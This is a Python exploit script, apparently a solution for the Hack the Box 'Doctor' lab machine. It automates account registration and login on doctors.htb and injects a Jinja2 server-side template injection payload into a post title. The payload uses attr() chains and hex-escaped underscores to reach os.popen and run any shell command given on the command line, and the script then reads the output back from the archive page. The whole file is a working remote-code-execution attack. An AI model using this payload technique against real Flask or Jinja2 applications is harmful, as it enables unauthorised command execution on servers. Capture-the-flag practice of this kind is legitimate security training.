import requests, re, argparse

proxies = {
    "http" : "http://127.0.0.1:8080"
}

# Parsing the commmand from the user
parser = argparse.ArgumentParser(prog='rce.py',
    description='Hack the Box Doctor RCE to get foothold',
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
    dest='command', help='command')
args = parser.parse_args()

def make_account(): # Creates account with a@a.a as email and a as password
    url = "http://doctors.htb/register"
    data = {'username' : 'aa', 'email' : 'a@a.a', 'password' : 'a', 'confirm_password' : 'a', 'submit' : 'Sign Up'}
    request = requests.post(url, data = data, proxies = proxies)

def get_cookie(): # Get's the cookie so we can post our message
    url = "http://doctors.htb/login"
    data = {'email' : 'a@a.a', 'password' : 'a', 'submit' : 'Login'}
    session = requests.Session()
    request = session.post(url, data = data, proxies = proxies)
    cookie = session.cookies.get_dict()
    return cookie

def send_payload(cookie, command): # Sends the command payload as the message title
    url = 'http://doctors.htb/post/new'
    payload = "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('" + command + "')|attr('read')()}}"
    data = {'title' : payload, 'content' : 'a', 'submit' : 'Post'}
    request = requests.post(url, cookies = cookie, data = data, proxies = proxies)
    
def read_output(cookie): # Reads the output from the most recent command
    url = "http://doctors.htb/archive"
    response = requests.get(url, cookies = cookie, proxies = proxies)
    html = response.text
    outputs = re.findall(r'<title>\s*([\s\S]+?)\s*</title>', html)
    output = outputs[-1]
    return output


############## Main ################
make_account()
cookie = get_cookie()
command = args.command
send_payload(cookie, command)
output = read_output(cookie)
print(output)